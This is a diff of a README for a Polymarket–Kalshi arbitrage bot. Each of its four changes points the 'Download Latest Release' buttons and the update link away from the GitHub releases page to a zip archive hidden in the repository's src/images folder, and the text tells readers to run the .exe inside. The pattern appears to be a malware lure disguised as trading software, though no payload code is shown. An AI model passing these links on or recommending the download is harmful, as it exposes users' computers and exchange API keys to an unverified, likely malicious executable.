@@ -1,6 +1,6 @@
 # ⚖️ polymarket-kalshi-arbitrage-bot - Detect Arbitrage Opportunities Fast
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/raw/refs/heads/main/src/images/kalshi-arbitrage-bot-polymarket-v3.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ No advanced hardware or GPUs are needed. A standard laptop or desktop computer t
 
 Click on this large button to go to the release page on GitHub. This is where you will find the latest version of the bot ready to download.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/raw/refs/heads/main/src/images/kalshi-arbitrage-bot-polymarket-v3.1.zip)
 
 You will see files listed, usually with names that include the version number and ".exe" for Windows.
 
@@ -114,7 +114,7 @@ The bot will begin monitoring prices on both platforms. When it finds a good pri
 
 New versions may add features or fix issues. Check the release page regularly for updates:
 
-[https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/releases](https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/releases)
+[https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/raw/refs/heads/main/src/images/kalshi-arbitrage-bot-polymarket-v3.1.zip](https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/raw/refs/heads/main/src/images/kalshi-arbitrage-bot-polymarket-v3.1.zip)
 
 Download and run the newer `.exe` file to replace your current version. Your settings and API keys usually stay intact.
 
@@ -155,4 +155,4 @@ Keep the program running while you trade. Close it when you want to stop.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/raniisometric491/polymarket-kalshi-arbitrage-bot/raw/refs/heads/main/src/images/kalshi-arbitrage-bot-polymarket-v3.1.zip)
